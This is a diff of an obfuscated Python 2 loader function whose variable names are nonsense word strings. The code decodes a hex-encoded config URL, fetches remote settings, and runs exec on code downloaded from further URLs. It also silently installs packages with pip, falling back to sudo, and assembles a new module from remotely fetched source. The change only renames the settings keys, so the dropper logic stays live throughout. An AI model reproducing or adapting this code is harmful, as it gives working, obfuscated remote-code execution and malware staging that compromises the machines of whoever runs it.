@@ -12,13 +12,14 @@ def run(*args, **kwargs):
     SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
     IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
     AccidentalAquaticCactus = loads(urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
-    AccidentalAquaticCactus['settings']['__f__'] = IncontinentObtuseCucumber(globals().get('__file__')) if '__file__' in globals() else None
-    ReflectiveTightfistedTrapezoid = AccidentalAquaticCactus['settings'].get('v')
+    ReflectiveTightfistedTrapezoid = AccidentalAquaticCactus['settings'].get('__v__')
+    if '__file__' in globals():
+        AccidentalAquaticCactus['settings']['__f__'] = IncontinentObtuseCucumber(__file__)
     try:
         GroovySophisticatedLemur = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
         if not len(GroovySophisticatedLemur):
-            exec urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('y'))).read() in globals()
-            exec urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('x'))).read() in globals()
+            exec urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__y__'))).read() in globals()
+            exec urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__x__'))).read() in globals()
         BloatedLionProlapse = lambda x: os.popen(' '.join(['{}'.format(i) for i in x])).read().rstrip()
         for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCactus['packages'][os.name][str(calcsize('P') * 8)].items():
             GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', FoamyNonstopHistory]) or BloatedLionProlapse(['sudo', GroovySophisticatedLemur, 'install', FoamyNonstopHistory]) or BloatedLionProlapse([GroovySophisticatedLemur, 'install', NobleRusticWalrus])    
@@ -28,8 +29,8 @@ def run(*args, **kwargs):
                 GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', os.path.basename(NobleRusticWalrus)])
             ChivalrousIntergalacticPlayboy = os.remove(os.path.basename(NobleRusticWalrus)) if os.path.isfile(os.path.basename(NobleRusticWalrus)) else None
     finally:
-        RoundPluckyScallion = urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('w'))).read()
-        AmbiguousObedientQuestion = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('u'))
+        RoundPluckyScallion = urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__w__'))).read()
+        AmbiguousObedientQuestion = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__u__'))
         TalentedAlcoholicBeetle = os.path.splitext(os.path.basename(AmbiguousObedientQuestion))[0]
         PanoramicAbandonedCraftsman = new_module(TalentedAlcoholicBeetle)
         QuarrelsomeImportedAtom = '\n\n'.join([RoundPluckyScallion, urlopen(AmbiguousObedientQuestion).read()])
